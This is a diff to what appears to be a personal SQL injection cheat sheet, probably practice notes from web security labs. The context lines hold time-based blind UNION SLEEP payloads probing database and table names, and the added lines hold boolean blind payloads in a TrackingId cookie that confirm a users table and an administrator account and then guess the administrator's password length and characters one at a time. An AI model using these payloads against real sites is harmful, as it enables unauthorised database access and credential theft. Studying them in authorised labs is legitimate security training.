@@ -103,4 +103,8 @@ admin123' UNION SELECT SLEEP(5),2;--
 admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 admin123' UNION SELECT sleep(5),2 FROM information_schema.tables WHERE table_schema like 'sqli_%r%' and table_name like 'a%';--
 
-
+Extracting sensitive data via SQL error messages:   
+confirming that there is a table called users -                          TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' -- -
+confirming that there is a user called administrator -                   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a -- -
+confirming that the password is greater than 1 character in length -     xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a -- -
+test the first letter against a specific value -                         xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a -- -
